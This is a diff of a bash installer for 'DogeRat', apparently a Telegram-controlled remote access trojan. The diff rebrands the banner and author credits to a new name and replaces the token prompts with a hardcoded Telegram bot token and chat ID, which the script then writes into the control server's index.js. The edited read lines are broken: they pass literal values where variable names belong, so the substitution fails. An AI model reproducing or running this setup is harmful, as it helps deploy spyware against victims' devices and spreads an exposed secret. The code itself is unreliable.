@@ -16,13 +16,13 @@ echo -e "██║░░██║██║░░██║██║░░██�
 echo -e "██║░░██║██║░░██║██║░░╚██╗██╔══╝░░██╔══██╗██╔══██║░░░██║░░░"
 echo -e "██████╔╝╚█████╔╝╚██████╔╝███████╗██║░░██║██║░░██║░░░██║░░░"
 echo -e "╚═════╝░░╚════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░${RESET}"
-echo -e "${YELLOW}               ░D░O░G░E░ ░R░A░T░B░Y░S░ ░H░I░V░ ░A░Y░A░D░A░V░${RESET}"
+echo -e "${YELLOW}               ░D░O░G░E░ ░R░A░T░B░Y░R░ ░O░Y░A ░K░A░T░S░I░C░${RESET}"
 
 
 echo -e "\e[0m"
-echo "Author: shivayadv & Did-Dog"
-echo "Github: shivaya-dav & did-dog"
-echo "Telegram channel: cybershieldx"
+echo "Author: Royal-Katsic"
+echo "Github: Royal-Katsic"
+echo "Telegram channel: royalkatsictips"
 echo -n "Loading "
 timeout 10s bash -c '
 while true
@@ -66,8 +66,8 @@ else
     rm node_modules.zip
 fi
 
-read -p "Enter your bot token: " token
-read -p "Enter your chat ID: " id
+read -p "Enter Your Bot Token: " 7353111356:AAGS0xRqVeWQFvLwGNWUnp27l4rH-Tfc57w
+read -p "Enter your chat ID: " 7124841071
 sed -i "s/const token = 'your token here'/const token = '$token'/g" index.js
 sed -i "s/const id = 'chat id here'/const id = '$id'/g" index.js
 echo "Server uploaded successfully! Now open new tab and follow rest instructions"
